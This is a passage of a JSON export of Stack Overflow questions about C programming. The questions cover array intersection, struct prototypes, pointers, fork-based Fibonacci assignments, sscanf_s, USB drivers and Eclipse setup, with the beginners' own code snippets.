declaration</p>\n\n<pre><code>int arreglo[7][5]={{1,194,48,206,45},{2,180,20,320,16},{3,221,90,140,20},{4,432,50,821,14},{5,820,61,946,18},{0,0,0,0,0},{0,0,0,0,0}};\n</code></pre>\n\n<p>and the last one will store each percentaje</p>\n"},{"tags":["java","c++","c","algorithm"],"answer_count":13,"favorite_count":3,"up_vote_count":17,"down_vote_count":0,"view_count":647,"score":17,"question_id":13270491,"title":"Best way to find intersection between two array","body":"<p>This problem I faced many times during various situations. It is generic to all programming language although I am comfortable with C or Java.</p>\n\n<p>Let us consider there are two arrays (or collections) as-</p>\n\n<pre><code>char[] A = {'a', 'b', 'c', 'd'};\nchar[] B = {'c', 'd', 'e', 'f'};\n</code></pre>\n\n<p>Now how to get the common elements between the two arrays as an other array ?\nIn this case, intersection of Array A &amp; B is: <code>char[] c = {'c', 'd'}</code>.</p>\n\n<p>I mean I want to avoid the repeated iteration of one array inside other array which will\nIncrease the execution time by (Length of A X Length of B) which is too much in case of huge arrays.</p>\n\n<p>Is there any way we would do a single pass in each array to get the common elements?</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":113,"score":5,"question_id":13271494,"title":"how to find max value with less iterations","body":"<p>I am changing the phase of signal from 0 to 360 by each degree to get max voltage value.Because if i change phase of the signal the voltage also changes.I have the fallowing code to find max value.</p>\n\n<pre><code>void Maxphase(float *max, unsigned int *index) \n{\n*max = 0.0;\nfloat value;\nunsigned int i, data;\nfor (i=0;i&lt;=360;i++) \n{              \n    phaseset(i); \n    delay_ms(100);\n    data = readvalue(); \n    value = voltage(mux1);    \n    if(value &gt; *max)   //find max value \n    { \n        *max = value;    //max voltage \n        *index = i;   \n    }  \n}                           \n}\n</code></pre>\n\n<p>from the above code I am getting Max value(voltage) after 38 sec(360*100) because for every read operation my device needs 100ms delay. This is too large, I can't change hardware thus i want to get the max value within 2 to 3 sec by optimizing software.\nthen I have tried with the fallowing code.</p>\n\n<pre><code>void Maxphase(float *max1, unsigned int *index1) \n{\n  max = 0.0;\n  float value;\n  unsigned int i,j,data;\n  for (i=0;i&lt;=360;i+=10) \n   {              \n    phaseset(i); \n    delay_ms(100);\n    data = readvalue(); \n    value = voltage(mux1);    \n    if(value &gt; max)   //find max value \n    { \n        max = value;    //max voltage \n        index = i;   \n    }  \n   }    \n   *max1=max;\n   *index1=index;\n   for (i=*index1-9;i&lt;=*index1+9;i+=1) \n     {       \n     j=i;       \n    phaseset(j); \n    delay_ms(100);\n    data = readvalue(); \n    value = voltage(mux1);    \n    if(value &gt; *max1)   //find max value \n    { \n        *max1 = value;    //max voltage \n        *index1 = i;   \n    }  \n    }                         \n}\n</code></pre>\n\n<p>I have reduced time from 45 sec to 7 sec. i have reduced iterations 360 to 54(54*100). I want to reduce it 7 sec to 2 sec. </p>\n\n<p>Can any one help me with better algorithm that i can get max value from (0 to 360) with in 2 sec.</p>\n\n<p>I have measured the voltage values using scope by changing phase. I have written below how it vary voltage with phase.</p>\n\n<pre><code>Phase (degree)     voltage(max)\n  0             0.9mv\n\n 45             9.5mv\n\n 90             9.0mv\n\n135             0.9mv\n\n180             292mv\n\n225             601mv\n\n270             555mv\n\n315             230mv\n\n360             0.9mv\n</code></pre>\n\n<p>I am new to C programming. Can anyone provide sample code for the best algorithm.</p>\n"},{"tags":["php","c","regex","preg-match","phalcon"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13276903,"title":"Regex with brackets","body":"<p>I am looking for some help with regex.</p>\n\n<p>I have this piece of code:</p>\n\n<pre><code>$router-&gt;add( \n    '/activate/{token:[a-zA-Z0-9]+}', \n    array (\n        'module' =&gt; 'frontend',\n        'controller' =&gt; 'user',\n        'action'     =&gt; 'activate'\n    )\n);\n</code></pre>\n\n<p>which works just fine. However the one below does not:</p>\n\n<pre><code>$router-&gt;add( \n    '/activate/{token:[a-zA-Z0-9]{32}}', \n    array (\n        'module' =&gt; 'frontend',\n        'controller' =&gt; 'user',\n        'action'     =&gt; 'activate'\n    )\n);\n</code></pre>\n\n<p>The matching mechanism that I have in C is (which works with preg_match_all also)</p>\n\n<pre><code>'#{([a-zA-Z][a-zA-Z0-9\\_\\-]*)(:([^}]+))*}#'\n</code></pre>\n\n<p>I would appreciate some pointers as to how to make the second example work.</p>\n\n<p><strong>EDIT</strong></p>\n\n<pre><code>preg_match_all(\n    '#{([a-zA-Z][a-zA-Z0-9\\_\\-]*)(:([^}]+))*}#',\n    '/manual/{language:[a-z]{2}}/{file:[a-z]+}.html',\n    $matches,\n    PREG_SET_ORDER\n);\n</code></pre>\n\n<p>I want it to return something like this:</p>\n\n<pre><code>Array\n(\n    [0] =&gt; Array\n        (\n            [0] =&gt; {language:[a-z]{2}}\n            [1] =&gt; language\n            [2] =&gt; :[a-z]{2}\n            [3] =&gt; [a-z]{2}\n        )\n    [1] =&gt; Array\n        (\n            [0] =&gt; {file:[a-z]+}\n            [1] =&gt; file\n            [2] =&gt; :[a-z]+\n            [3] =&gt; [a-z]+\n        )\n)\n</code></pre>\n"},{"tags":["c","openmp","cpu-usage"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13224269,"title":"OpenMP on single core","body":"<p>Can I to use OpenMP on a machine with a single core cpu? There will be some improvement in the performance?</p>\n"},{"tags":["c","struct","function-prototypes"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13279107,"title":"prototyping a function with a struct pointer as a parameter","body":"<p>I have been running in circles with this problem. I have a struct declared in extern.h:</p>\n\n<pre><code>typedef struct {\n    char data[Q_SIZE];\n    int head;\n    int tail;\n    int size;\n}queue;\n</code></pre>\n\n<p>in main.c I declare two instances of this struct:</p>\n\n<pre><code>queue rxq, txq;\n</code></pre>\n\n<p>in other .c files, if these structs are used they are declared as global externs ie:</p>\n\n<pre><code>extern queue rxq, txq;\n</code></pre>\n\n<p>in queue.c there are several functions that accept a pointer to one of these structs as a parameter:</p>\n\n<pre><code>int QGetSize(queue * q)\n{\n    return q-&gt;size;\n}\n</code></pre>\n\n<p>My compiler requires me to prototype these functions, but doesn't like the way I'm prototyping them:</p>\n\n<pre><code>int QGetSize(queue *);\nERROR: parse error at near '*'\n\nint QGetSize(queue);\nERROR: invalid functions argument declaration\n\nint QGetSize(struct *);  // this is the one that to me, should work. the other errors make sense.\nERROR: parse error at near '*'\n\nint QGetSize(struct);\nERROR: parse error at near ')'\n\nint QGetSize(struct queue *);\nWARNING: struct declared inside parameter list\n</code></pre>\n\n<p>it's probably important to note that within the prototype.h file, their is no typedef of queue as this struct, if I try to typedef it or redefine it or even include the .h file where it is originally declared, I get more errors.</p>\n"},{"tags":["c","data-structures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13279609,"title":"How to create a pointer inside a struct","body":"<p>I have the following structs:</p>\n\n<pre><code>typedef struct bucket {\n    unsigned int contador; \n    unsigned int * valor;\n} Bucket;\n\ntypedef struct indice {\n    unsigned int bs;            \n    unsigned int valor;      \n    unsigned int capacidade; \n    Bucket * bucket;\n} Indice;\n\ntypedef struct tabela {\n    unsigned int bs; \n    Indice * indice;\n} Tabela;\n</code></pre>\n\n<p>And I want to do something like this:</p>\n\n<pre><code>tabela-&gt;indice[2].bucket = &amp;tabela-&gt;indice[0].bucket;\n</code></pre>\n\n<p>But I get segmentation fault.</p>\n\n<p>How can I get the <code>tabela-&gt;indice[0].bucket</code> address and associate to <code>tabela-&gt;indice[2].bucket</code>.</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","c","getch"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1936,"score":0,"question_id":1864076,"title":"Equivalent function to C's \"_getch()\" in Java?","body":"<p>I was messing around with C/C++ and recently found <code>the _getch()</code> function. I also recently got an invite to Google Wave (amazing, btw), and I wanted to emulate the ability to send messages before you actually hit the enter key. However, I don't know much (anything &lt;.&lt;) about networking in C/C++, while I know a decent amount about it in Java.</p>\n\n<p>Point:\nIs there a Java equivalent to the C function <code>_getch()</code>?</p>\n\n<p>Thanks,\nPandemic</p>\n"},{"tags":["c","printf"],"answer_count":7,"favorite_count":1,"up_vote_count":13,"down_vote_count":1,"view_count":10617,"score":12,"question_id":2454474,"title":"What is the difference between printf() and puts() in C?","body":"<p>I know you can print with <code>printf()</code> and <code>puts()</code>. I can also see that <code>printf()</code> allows you to interpolate variables and do formatting.</p>\n\n<p>Is <code>puts()</code> merely a primitive version of <code>printf()</code>. Should it be used for every possible <code>printf()</code> without string interpolation?</p>\n"},{"tags":["c","linked-list","free"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13279637,"title":"Setting anchor of one way list to 2nd element and freeing previous first element","body":"<p>Currently it seems like I'm loosing the list when trying to achieve that. Where am I getting it wrong?</p>\n\n<pre><code>// My anchor\nSnakePart **tail;\n\n...\n\nSnakePart *remember;\nremember = *tail;\ntail = &amp;((*tail)-&gt;next);\nfree(remember-&gt;values);\nfree(remember);\n</code></pre>\n"},{"tags":["ios","c","xcode","json","parsing"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":170,"score":0,"question_id":11781848,"title":"Need assistance getting (parsing?) these JSON data into Xcode","body":"<p>Before I start, I would like to say that I'm quite a newbie to Xcode and the C Language, and I'm trying my best to learn as much as I can. I have researched for about 2 days now before posting this question but could not find anything helpful :( I am genuinely stuck and would appreciate ANY help. This is most likely a very <strong>simple</strong>/basic question:</p>\n\n<p>Basically, I am trying to get this data (<a href=\"http://countdown.api.tfl.gov.uk/interfaces/ura/instant_V1?StopCode1=59581&amp;DirectionID=1&amp;VisitNumber=1&amp;ReturnList=StopCode1,StopPointName,LineName,DestinationText,EstimatedTime,MessageUUID,MessageText,MessagePriority,MessageType,ExpireTime\" rel=\"nofollow\">LINK</a>) which is apparrently in UTF-8 JSON and display it on a simple label on Xcode. However, I do not know how to get that data and parse it at all. I've followed a <a href=\"http://www.raywenderlich.com/5492/working-with-json-in-ios-5\" rel=\"nofollow\">tutorial online</a> with success, but that deals with JSON objects rather than arrays (which I think I am dealing with).</p>\n\n<p>I would HIGHLY appreciate it if someone could extract/parse the data from the first link given into a basic label on Xcode in code format.Preferably with commentary on what most lines of code are doing for my own benefit, as this would really help me understand how it works. Hopefully from there, I would be able to make good progress.</p>\n\n<p>Once again this is highly appreciated!</p>\n\n<p>Thank YOu.</p>\n\n<p>Here's a sample of the JSON URL for convenience if you don't want to click the link:</p>\n\n<pre><code>[4,\"1.0\",1343920773538]\n[1,\"Spring Gardens\",\"59581\",\"275\",\"Barkingside\",1343920940000,1343920940000]\n[1,\"Spring Gardens\",\"59581\",\"275\",\"Barkingside\",1343921717000,1343921717000]\n[1,\"Spring Gardens\",\"59581\",\"549\",\"Loughton\",1343921858000,1343921858000]\n[1,\"Spring Gardens\",\"59581\",\"275\",\"Barkingside\",1343922204000,1343922204000]\n[2,\"Spring Gardens\",\"59581\",\"8a56a0ab37b72b400137cb7cfd954038_29222\",0,3,\"Bus routes serving this stop are subject to change during the Olympics and Paralympics games. For more information visit www.tfl.gov.uk/buses for more information.\",1344668400000]\n</code></pre>\n"},{"tags":["objective-c","c","arrays","multidimensional-array","instance-variables"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13279413,"title":"Multi-dimensional array of unspecified size as an instance variable?","body":"<p>I am a bit of a beginner to OOP so this may be a silly question!</p>\n\n<p>I would like to use a multidimensional CArray as an instance variable in an objective-c class, and would also like to be able to specify it's size during runtime, during the objects initialisation method:</p>\n\n<pre><code>@interface ArrayClass : NSObject {\n\nint array[][];\n\n}\n\n-(id)initWithSizeX:(int)sizeX sizeY:(int)sizeY;\n\n@end\n</code></pre>\n\n<p>This produces the error \"Instance variable 'array' has unknown size.\"</p>\n\n<p>I can only seem to make use of the array if I declare it as having an initial size, say [20][20] for example - But that of course defeats the point because I want it to be decided at runtime!</p>\n\n<p>My guess that is this is necessary as the objects memory footprint needs to be known up front?</p>\n\n<p>Does anybody know if what I am trying to this is possible at all? Are there any workarounds that would allow me to size the array at runtime? Or am I going about this in completely the wrong way?</p>\n\n<p>I know there are a lot of topics about multi-dimensional arrays, but I cannot seem to find anything that answers my question!</p>\n"},{"tags":["c","visual-studio-2010","parsing","sscanf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13279209,"title":"The function sscanf_s fail when I use several strings","body":"<p>I don't understand why the code below fail :</p>\n\n<pre><code>char    toto[54], titi[54]; //I already tried with allocations\n\nsscanf_s(line, \"%s-%s\", &amp;toto, &amp;titi, sizeof(toto) + sizeof(titi));\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sscanf_s(line, \"%s-%s\", &amp;toto, &amp;titi, sizeof(toto) + sizeof(titi));\n</code></pre>\n\n<p>My problem is only with strings (float, int, double etc. its ok) and I use Visual 2010.</p>\n\n<p>Does anyone have an idea?\nThanks a lot in advance for your answer.</p>\n"},{"tags":["c","assembly","sse","simd","intrinsics"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":197,"score":2,"question_id":13204737,"title":"assembly intrinsic to do a masked load","body":"<pre><code>int main()\n{\n    const int STRIDE=2,SIZE=8192;\n    int i=0;\n    double u[SIZE][STRIDE]; \n    #pragma vector aligned\n    for(i=0;i&lt;SIZE;i++)\n    {\n        u[i][STRIDE-1]= i;\n    }\n    printf(\"%lf\\n\",u[7][STRIDE-1]);\n    return 0;\n}\n</code></pre>\n\n<p>The compiler uses xmm registers here. There is stride 2 access and  I want to make the compiler ignore this and do a regular load of memory and then mask alternate bits so I would be using 50% of the SIMD registers. I need intrinsics which can be used to load and then mask the register bitwise before storing back to memory</p>\n\n<p>P.S: I have never done assembly coding before</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":6,"view_count":59,"score":-4,"question_id":13274271,"title":"passing array of pointers","body":"<p>I am trying to send a array of pointers to function.<br/><br>\neach pointer is pointing to struct.<br/><br>\nNo idea how to do it please help me to understand what is the general body for it.<br/><br>\nThx.</p>\n\n<pre><code>#include &lt;ansi_c.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\n\nvoid  sortbyname(struct worker   *p); \n\nvoid main()\n{\n\n    struct worker{\n      char lastname[20],name[20];      \n      int  age;int Seniority,salary,offdays [12];\n    };\n\n  int i,j;\n  struct worker  employee[6],*pemp[6],*pS[6],*pN[6],*pill[6];\n\n\n  for (i=0;i&lt;6;i++)\n  {\n    pemp[i]=&amp;employee[i];\n    pS[i]=&amp;employee[i];\n    pN[i]=&amp;employee[i];\n    pill[i]=&amp;employee[i];\n  } \n\n  FILE *fp;\n  fp=fopen(\"c:\\\\Users\\\\iliya\\\\Documents\\\\National Instruments\\\\CVI\\\\hw1-t2\\\\worker.txt\",\"rt\");       \n\n  for (i=0;i&lt;6;i++)\n  {\n    fscanf(fp,\"%s\",pemp[i]-&gt;lastname);\n    fscanf(fp,\"%s\",pemp[i]-&gt;name); \n    fscanf(fp,\"%d\",&amp;pemp[i]-&gt;age);\n    fscanf(fp,\"%d\",&amp;pemp[i]-&gt;Seniority);\n    fscanf(fp,\"%d\",&amp;pemp[i]-&gt;salary);\n    for (j=0;j&lt;12;j++)\n    fscanf(fp,\"%d\",&amp;pemp[i]-&gt;offdays[j]);\n\n  } \n\n  sortbyname(pemp );\n  //  sortbysalary();\n  //  sortbydaysoff();             \n  getchar();     \n}`  \n</code></pre>\n"},{"tags":["c","memory-management"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":13277707,"title":"Memorymanagement in C, passing pointers in functions, segmentation fault","body":"<p>I have three files:</p>\n\n<h3>something.h</h3>\n\n<pre><code>typedef struct {\n    int size_t;\n    char *c;\n} p;\n\np ** createMatrix(int r, int c);\n\nvoid printMatrix(p **matrix, const int r, const int c);\n</code></pre>\n\n<h3>something.c</h3>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"something.h\"\n\np **\ncreateMatrix(int r, int c)\n{\n    int rowsize=r*2+1;\n    int colsize=c*2+1;\n\n    /* memory alloc of rows */\n    p **matrix=malloc(rowsize*sizeof(p *));\n    int k;\n    for(k=0; k&lt;rowsize; k++)\n    {\n        /* memory alloc of columns */\n        matrix[k]=malloc(colsize*sizeof(p));\n    } \n    int i, j;\n    for(i=0; i&lt;rowsize; i++)\n    {\n        for(j=0; j&lt;colsize; j++)\n        {\n            /* columns is between letters */\n            if(j%2!=0)\n            {   \n                matrix[i][j].size_t=7;\n                matrix[i][j].c=malloc(8*sizeof(char));\n                strcpy(matrix[i][j].c,\"       \");\n            }\n            else if(i%2==0 &amp;&amp; j%2==0)\n            {\n                matrix[i][j].size_t=1;\n                matrix[i][j].c=malloc(sizeof(char));\n                *(matrix[i][j].c)='a';\n            }\n            else\n            {\n                matrix[i][j].size_t=1;\n                matrix[i][j].c=malloc(sizeof(char));\n                *(matrix[i][j].c)=' ';\n            }\n        }\n    }       \n    return matrix;\n}\n\nvoid\nprintMatrix(p **matrix, const int r, const int c)\n{\n    int rowsize=r*2+1;\n    int colsize=c*2+1;\n    printf(\"\\n\");\n    int i, j;\n    for(i=0; i&lt;rowsize; i++)\n    {\n        printf(\"\\t\");\n        for(j=0; j&lt;colsize; j++)\n        {\n            if(matrix[i][j].size_t==1)\n                printf(\"%c\", *matrix[i][j].c);\n            else\n                printf(\"%s\", matrix[i][j].c);\n\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n }\n</code></pre>\n\n<h3>main.c</h3>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include \"something.h\"    \n\nvoid\nprintMenufunction(p **matrix, int rows, int cols)\n{\n    int rowsize=rows*2+1;\n    int colsize=cols*2+1;\n    /* memory alloc of rows */\n    matrix=malloc(rowsize*sizeof(p *));\n    int i;\n    for(i=0; i&lt;rowsize; i++)\n    /* memory alloc of columns */\n        matrix[i]=malloc(colsize*sizeof(p));\n    matrix=createMatrix(rows, cols);\n}\n\nint\nmain(void)\n{\n    int rows, cols;\n    p **matrix;\n    char stringtemp[3];\n    printf(\"ask for row and col in form (5x5):\\n\");\n    scanf(\"%s\", stringtemp);\n    sscanf(stringtemp, \"%dx%d\", &amp;rows, &amp;cols);\n    printMenufunction(matrix, rows, cols);\n    printMatrix(matrix, rows, cols);\n    return 0;\n}\n</code></pre>\n\n<p>This code sample that is a simplified version of my prog gives me a segmentation fault. I have debugged it with the gdb so I know its somewhere amongst these lines that the fault lies. I would be grateful for some help, thanks.</p>\n\n<p>UPDATE:\nI can't debug this version. My old prog with alot more code told me it was along this area, but at least I can't figure out where? So thats why I can't post what line exactly that makes the segmentation fault. If i knew I think I could have handled the problem my self. I hoped some one could see it more clearly than me..</p>\n"},{"tags":["c","embedded","arm","realview"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13272223,"title":"Force the Compiler Not to Link to Certain Object Files","body":"<p>I'm currently investigating the possibility to force the rvct compiler not to link in specific translation units and just pretend that it has linked it.</p>\n\n<p>Our product is running very tight on space constraints and have trouble integrating some unit tests with it while keeping the space under control.</p>\n\n<p>Basically, the memory we can leverage during run time is more than sufficient to store our unit tests, but we don't have sufficient rom space to hold them.</p>\n\n<p>We have means to control exactly which segment of memory of our code goes in on our device in the scatter file, so we're thinking along the lines of defining which region the unit test codes will be located and somehow <em>force</em> the compiler not to link in that specific code during compile time.</p>\n\n<p>Something like the following:</p>\n\n<pre><code>Result UnitTestEntryPoint (UnitTest suite) {\n   if (hasTestInMemory) {\n      switch (suite) {\n          case EncrpytionTest:\n              return EncrptyUnitTest();\n          // more tests.\n      }\n   }\n}\n\n// Actual Tests, can we not link this code, but just pretend we link to them?\nResult EncrpyUnitTest (void) {\n    // Do stuff...\n}\n</code></pre>\n\n<p>Then during runtime, we'll upload the unit test binaries to the specified memory region that we define in the scatter file, and flip the <code>hasTestInMemory</code> to <code>true</code>.</p>\n\n<p>Is this possible?</p>\n\n<p>Or if not, can someone point me to the right direction of looking for a solution that somehow meets our space constraint and able to load unit tests during run time.</p>\n\n<p>Thanks,</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":97,"score":-1,"question_id":9590396,"title":"Error using fork() to get the child printing a fibonnaci sequence that's length comes from command line","body":"<p>For an assignment I am suppose to simply create a <code>fork()</code> process where the child prints the fibonacci sequence that its length is given from the command line. I am getting 2 errors that I don't really understand why (and I am guessing they're very stupid as well)</p>\n\n<blockquote>\n  <p>proj1.c:16: error: for loop initial declaration used outside C99mode</p>\n  \n  <p>proj1.c:18: warning: passing argument 1 of printf makes pointer from integer without a cast.</p>\n</blockquote>\n\n<p>Obviously 18 is a warning, but I need to fix that as well... this being compiled with gcc...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt; /* for fork */\n#include &lt;sys/types.h&gt; /* for pid_t */\n#include &lt;sys/wait.h&gt; /* for wait */\nint fibonacci(int n)\n{\n  int first = 0;\n  int second = 1;\n  int total;\n  for (int i=0;i&lt;n;i++)\n  {\n    printf(first, \"\\n\");\n    total = first + second;\n    first = second;\n    second = total;\n  }\n  return 0;\n}\nint main(int argc, char *argv[])\n{\n    /*Spawn a child to run the program.*/\n    pid_t pid=fork();\n    if (pid==0) { /* child process */\n        fibonacci(argc);\n    }\n    else { /* pid!=0; parent process */\n        waitpid(pid,0,0); /* wait for child to exit */\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","pointers","address"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":1,"view_count":90,"score":4,"question_id":13262893,"title":"How do you know the exact address of a variable?","body":"<p>So I'm looking through my C programming text book and I see this code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint j, k;\nint *ptr;\n\nint main(void)\n{\n    j = 1;\n    k = 2;\n    ptr = &amp;k;\n    printf(\"\\n\");\n    printf(\"j has the value %d and is stored at %p\\n\", j, (void *)&amp;j);\n    printf(\"k has the value %d and is stored at %p\\n\", k, (void *)&amp;k);\n    printf(\"ptr has the value %p and is stored at %p\\n\", ptr, (void *)&amp;ptr);\n    printf(\"The value of the integer pointed to by ptr is %d\\n\", *ptr);\n\n    return 0;\n}\n</code></pre>\n\n<p>I ran it and the output was:</p>\n\n<blockquote>\n  <p>j has the value 1 and is stored at 0x4030e0<br><br>\n  k has the value 2 and is stored at 0x403100<p>\n  ptr has the value 0x403100 and is stored at 0x4030f0<p>\n  The value of the integer pointed to by ptr is 2</p>\n</blockquote>\n\n<p>My question is if I had not ran this through a compiler, how would you know the address to those variables by just looking at this code? I'm just not sure how to get the actual address of a variable. Thanks!</p>\n"},{"tags":["c","include"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":9591481,"title":"#including files","body":"<p>I got a problem with including files.\nWhat I've basically made is a command-line program in C that works with a csv file. It has 5 commands: -menu, -add, -edit, -del, -verify. All is good except for the -menu. What needs to happen when I type \"./passweb -menu\" is for a visual menu to appear. This menu command should call a new function and it needs to be located in a separate c file (aka menu.c). </p>\n\n<p>The problem I'm having right now is that I'm not too sure how to include the files to run in the menu.c because the way I have it set up right now, passweb.c has all the functions such as -add and -edit and etc. I know you need to make header files and such but it's complaining that I've declared the methods twice which is true since I use the functions in the menu file.</p>\n\n<p>Here's some of the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"cipher.h\"\n#include \"menu.h\"\n#include \"passweb.h\"\n#define MAXLENGTH 51 //longest length of a single record + 1 =51 bytes\n#define SIZEOFDB 1000\n#define ENCRYPT 5\n\ntypedef struct rec\n{\n    char name[MAXLENGTH];\n    char pw[MAXLENGTH];\n    char type[6];\n    int boolean;\n}RECORD;\n\nint add(char *nName, char *nPw, char *nType, RECORD *arr, int size);\nvoid del (char *tName, RECORD *arr, int size);\nint edit(char *nName, char *nPw, char *nType, char *tName, char *tPw, RECORD *arr, int size);\nint verify (char *tName, char *tPw, RECORD *arr,int size);\n</code></pre>\n\n<p>This is my main file \"passweb.c\" and it's declared the functions.\nLater on in the main, I will call a menu function which is located in a menu.c file.\nIn the menu function I use \"add\",\"edit\",\"del\" and etc that I wrote in this .c file.\nAs you can see on the top, I have included the header files.</p>\n\n<p>What can I do to solve this problem?\nSorry for the long post.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","windows","embedded","driver"],"answer_count":4,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":800,"score":5,"question_id":1562891,"title":"How to implement a USB device driver for Windows?","body":"<p>How should I approach implementing a USB device driver for Windows? How should I take into account different versions of windows e.g:\n - Windows XP\n - Windows Vista\n - Windows 7</p>\n\n<p>Is there open source solutions which could be used as a starting point? I'm a total newbie to windows driver development.</p>\n\n<p>We have an embedded device with USB device port and we would like to have as low latency communication from the application level to the device as possible without sacrificing the data throughput. The actual data transferred is ADC/DAC data. Basically there is a lot of data which we need to transfer to a Windows machine as fast as possible.</p>\n"},{"tags":["c","arrays"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":226,"score":0,"question_id":9592458,"title":"Comparing elements of an array to each other","body":"<pre><code>for (x=1; x&lt;=4; x++){\n    slope = ((x+1)-(x))/(a[x+1] - a[x]);\n    printf(\"Slope: %d \\n\", slope);\n}\n</code></pre>\n\n<p>So, yes. This is a homework question. I'm trying to compare every element of the array <code>a = {1, 2, 3, 4}</code> against every other element and find the slope. The <code>x</code>'s are the values and <code>y</code>'s are the indexes. Is this doing it? Shouldn't there be 16 slopes?</p>\n"},{"tags":["c","eclipse","gcc","eclipse-cdt"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":251,"score":1,"question_id":12753011,"title":"Program \"gcc\" not found in PATH with Eclipse CDT","body":"<p>I cannot seem to figure out how to use Eclipse CDT. </p>\n\n<p>I am on Mac OS X, and am trying to print \"Hello World\" in C but I get an error:</p>\n\n<blockquote>\n  <p>Program \"gcc\" not found in PATH. </p>\n</blockquote>\n\n<p><img src=\"http://i.stack.imgur.com/SCpnE.png\" alt=\"eclipse-cdt\"></p>\n\n<p>What can I do to use C in Eclipse?</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":714,"score":0,"question_id":9593434,"title":"using fork() function to make the child and parent process share memory","body":"<p>I am trying to get in a <code>fork()</code> scenario the child process to create a fibonnaci sequence and store it in a <code>struc</code> as <code>shared_data</code>. I need to use the exact struct from the assignment but I've never used it like this so I am assuming that the errors I have in this code are related to that...</p>\n\n<pre><code>26: error: expected identifier (before . token)\n39: error: expected identifier (before . token)\n44: error: expected expression before shared_data\n45: error: expected expression before shared_data\n</code></pre>\n\n<p>I figured I am using this wrong but what would be the proper way? if the struct was like this it would work:</p>\n\n<pre><code>struct cards{\n    int a;\n    int b;\n    int c;\n} cards={0,0,0};\n</code></pre>\n\n<p>then I can use <code>cards.a=3;</code> and so forth and so on... this is the first time I work with this kind of shared memory structure and while researching and looking around stack overflow as well, people ask questions that are similar but they just confuse me more. what would be the proper way of doing what I did below?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt; /* for fork */\n#include &lt;sys/types.h&gt; /* for pid_t */\n#include &lt;sys/wait.h&gt; /* for wait */\n#define MAX_SEQUENCE 10\n\ntypedef struct{\n    long fib_sequence[MAX_SEQUENCE];\n    int sequence_size;\n} shared_data;\n\nint fibonacci(int n)\n{\n  int first = 0;\n  int second = 1;\n  int total, i;\n  for (i=0;i&lt;=n;i++)\n  {\n    printf(\"%d\\n\", first);\n    shared_data.fib_sequence[i] = first;\n    total = first + second;\n    first = second;\n    second = total;\n  }\n  return 0;\n}\nint main(int argc, char *argv[])\n{\n    int j;\n    /*Spawn a child to run the program.*/\n    pid_t pid=fork();\n    if (pid==0) { /* child process */\n        shared_data.sequence_size = argc;\n        fibonacci(argc);\n    }\n    else { /* pid!=0; parent process */\n        waitpid(pid,0,0); /* wait for child to exit */\n        for (j=0; j&lt;=shared_data.sequence_size; j++)\n            printf(\"%d\\n\",shared_data.fib_sequence[j]);\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","linux","sockets","fork"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13278521,"title":"double fork causes socket in original parent to break","body":"<p>I do a double fork (fork, then the child forks again, I wait for the child, the grandchild is handled by init) in a process and after the child has closed I try to read from a socket that I had open in the parent previous to the fork. The read fails every time I run the program.</p>\n\n<p>The message is being sent using sendto() which returns an error code of ENOENT.</p>\n\n<p>Should this be working or am I [10]?</p>\n\n<p>Here is the code in the function that forks:</p>\n\n<pre><code>uint8_t\nupgrade(\n        char *server,\n        char *file)\n{\n    pid_t pid1, pid2;\n\n    int status;\n\n    if ((pid1 = fork()) &lt; 0)\n    {\n        /* Fork error */\n        log(\"FAILED: First fork() failed\");\n    }\n    else if (pid1 == 0)\n    {\n        /* First child */\n        if ((pid2 = fork()) &lt; 0)\n        {\n            /* Fork error */\n            